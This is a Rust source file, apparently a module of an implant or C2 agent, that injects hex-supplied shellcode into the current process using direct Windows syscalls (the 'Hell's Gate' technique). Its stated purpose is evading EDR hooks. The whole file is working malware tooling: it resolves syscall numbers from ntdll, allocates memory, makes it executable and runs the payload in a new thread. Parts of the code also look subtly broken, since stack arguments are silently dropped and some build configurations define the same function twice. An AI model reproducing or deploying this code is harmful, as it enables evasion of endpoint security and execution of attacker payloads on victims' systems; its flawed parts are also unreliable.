// Shellcode injection via direct syscalls (Hell's Gate technique)
// This bypasses userland EDR hooks by calling syscalls directly

#[cfg(windows)]
use std::ptr;

#[cfg(windows)]
use windows::Win32::System::LibraryLoader::{GetModuleHandleA, GetProcAddress};
#[cfg(windows)]
use windows::core::s;

// Hell's Gate: Extract syscall number from ntdll.dll
#[cfg(windows)]
unsafe fn get_syscall_number(function_name: &str) -> Option<u16> {
    let ntdll = GetModuleHandleA(s!("ntdll.dll")).ok()?;
    let func_addr = GetProcAddress(ntdll, windows::core::PCSTR(function_name.as_ptr()));
    
    if func_addr.is_none() {
        return None;
    }
    
    let func_addr = func_addr.unwrap() as *const u8;
    
    // Parse the function stub to extract syscall number
    // NT functions start with: mov r10, rcx; mov eax, <syscall_num>
    // Pattern: 4C 8B D1 B8 XX XX 00 00
    let stub = std::slice::from_raw_parts(func_addr, 24);
    
    // Check for the pattern
    if stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 && stub[3] == 0xB8 {
        // Extract syscall number (little endian)
        let syscall_num = u16::from_le_bytes([stub[4], stub[5]]);
        return Some(syscall_num);
    }
    
    None
}

// Direct syscall execution using inline assembly
#[cfg(all(windows, target_arch = "x86_64"))]
unsafe fn do_syscall(
    ssn: u16,
    arg1: usize,
    arg2: usize,
    arg3: usize,
    arg4: usize,
    _arg5: usize, // Stack args - handled by caller's stack frame
    _arg6: usize,
) -> isize {
    let result: isize;
    let ssn_u32 = ssn as u32;
    std::arch::asm!(
        "mov r10, rcx",
        "mov eax, {ssn:e}",
        "syscall",
        ssn = in(reg) ssn_u32,
        in("rcx") arg1,
        in("rdx") arg2,
        in("r8") arg3,
        in("r9") arg4,
        lateout("rax") result,
        options(nostack, preserves_flags)
    );
    result
}

#[cfg(windows)]
pub fn inject_shellcode(shellcode: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
    unsafe {
        // Resolve syscall numbers from ntdll
        let ssn_alloc = get_syscall_number("NtAllocateVirtualMemory\0")
            .ok_or("Failed to resolve NtAllocateVirtualMemory")?;
        let ssn_protect = get_syscall_number("NtProtectVirtualMemory\0")
            .ok_or("Failed to resolve NtProtectVirtualMemory")?;
        let ssn_create_thread = get_syscall_number("NtCreateThreadEx\0")
            .ok_or("Failed to resolve NtCreateThreadEx")?;
        
        let current_process = -1isize as usize; // HANDLE(-1) = current process
        let mut base_address: *mut std::ffi::c_void = ptr::null_mut();
        let mut region_size = shellcode.len();
        
        // NtAllocateVirtualMemory
        let status = do_syscall(
            ssn_alloc,
            current_process,
            &mut base_address as *mut _ as usize,
            0,
            &mut region_size as *mut _ as usize,
            0x3000, // MEM_COMMIT | MEM_RESERVE
            0x04,   // PAGE_READWRITE
        );
        
        if status != 0 {
            return Err(format!("NtAllocateVirtualMemory failed: 0x{:x}", status).into());
        }
        
        // Copy shellcode to allocated memory
        ptr::copy_nonoverlapping(
            shellcode.as_ptr(),
            base_address as *mut u8,
            shellcode.len(),
        );
        
        // NtProtectVirtualMemory - change to executable
        let mut old_protect: u32 = 0;
        let status = do_syscall(
            ssn_protect,
            current_process,
            &mut base_address as *mut _ as usize,
            &mut region_size as *mut _ as usize,
            0x20, // PAGE_EXECUTE_READ
            &mut old_protect as *mut _ as usize,
            0,
        );
        
        if status != 0 {
            return Err(format!("NtProtectVirtualMemory failed: 0x{:x}", status).into());
        }
        
        // NtCreateThreadEx - execute shellcode
        let mut thread_handle: usize = 0;
        let status = do_syscall(
            ssn_create_thread,
            &mut thread_handle as *mut _ as usize,
            0x1FFFFF, // THREAD_ALL_ACCESS
            0,
            current_process,
            base_address as usize,
            0,
        );
        
        if status != 0 {
            return Err(format!("NtCreateThreadEx failed: 0x{:x}", status).into());
        }
        
        Ok("Shellcode injected via direct syscalls".to_string())
    }
}

#[cfg(not(windows))]
pub fn inject_shellcode(_shellcode: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
    Err("Shellcode injection only supported on Windows".into())
}

#[cfg(not(target_arch = "x86_64"))]
pub fn inject_shellcode(_shellcode: &[u8]) -> Result<String, Box<dyn std::error::Error>> {
    Err("Direct syscalls only supported on x86_64".into())
}

// Handle the injectsc command
pub fn handle_inject_sc(args: &[String]) -> Result<String, Box<dyn std::error::Error>> {
    if args.is_empty() {
        return Err("usage: injectsc <hex_shellcode>".into());
    }
    
    // Join all args and clean up
    let mut hex_shellcode = args.join("");
    hex_shellcode = hex_shellcode.trim_matches('"').to_string();
    hex_shellcode = hex_shellcode.replace(" ", "");
    hex_shellcode = hex_shellcode.replace("\n", "");
    hex_shellcode = hex_shellcode.replace("\r", "");
    hex_shellcode = hex_shellcode.replace("\t", "");
    
    if hex_shellcode.is_empty() {
        return Err("empty shellcode provided".into());
    }
    
    if hex_shellcode.len() % 2 != 0 {
        return Err("invalid hex shellcode: odd length".into());
    }
    
    // Decode hex to bytes
    let shellcode = hex::decode(&hex_shellcode)?;
    
    if shellcode.is_empty() {
        return Err("decoded shellcode is empty".into());
    }
    
    // Inject and execute
    inject_shellcode(&shellcode)
}

